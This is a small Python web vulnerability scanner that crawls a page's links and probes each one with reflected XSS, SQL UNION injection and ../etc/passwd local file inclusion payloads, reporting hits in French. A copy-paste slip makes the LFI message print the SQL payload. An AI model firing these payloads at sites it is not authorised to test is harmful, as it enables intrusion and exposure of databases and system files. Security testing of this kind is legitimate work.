from bs4 import BeautifulSoup
import requests

def get_url_list(session, toCheck):
    response = session.get(toCheck)
    soup = BeautifulSoup(response.content, "html.parser")
    links = soup.find_all("a")
    url_list = []
    for link in links:
        url_list.append('/' + link.get("href"))
    return url_list

def check_vulnerabilities(session, url_list, host):
    xss_payload = '<script>alert("ok")</script>'
    sql_payload = "'+UNION+SELECT+@@VERSION,+%27OKAY%27+%23"
    lfi_payload = "../../../../../../../etc/passwd"

    xss_count = 0
    sql_count = 0
    lfi_count = 0
    link = " "

    for index, link in enumerate(url_list):

        # Check for XSS injection vulnerability
        url = host + "{}?name={}#".format(link, xss_payload)
        response = session.get(url)
        if xss_payload in response.text:
            xss_count += 1
            print(f"-- XSS injection ==> Faille XSS reflected détectée dans la page : {host}{link}\n Payload utilisée = {xss_payload}")

        # Check for SQL injection vulnerability
        url = host + "{}?id={}+&Submit=Submit#".format(link, sql_payload)
        response = session.get(url)
        if 'OKAY' in response.text:
            sql_count += 1
            print(f"-- SQL injection ==> La base de données est accessible dans la page : {host}{link}\n Payload utilisée = {sql_payload}")

        # Check for LFI vulnerability
        url = host + "{}?page={}".format(link, lfi_payload)
        response = session.get(url)
        if "root:x:0:0:root:/root:/" in response.text:
            lfi_count += 1
            print(f"-- LFI vulnerab. ==> Faille de l'inclusion de fichier local détectée à l'URL : {host}{link}\n Payload utilisée = {sql_payload}")
    print(f"test : {link}")

    return xss_count, sql_count, lfi_count, xss_payload, sql_payload, lfi_payload, host, link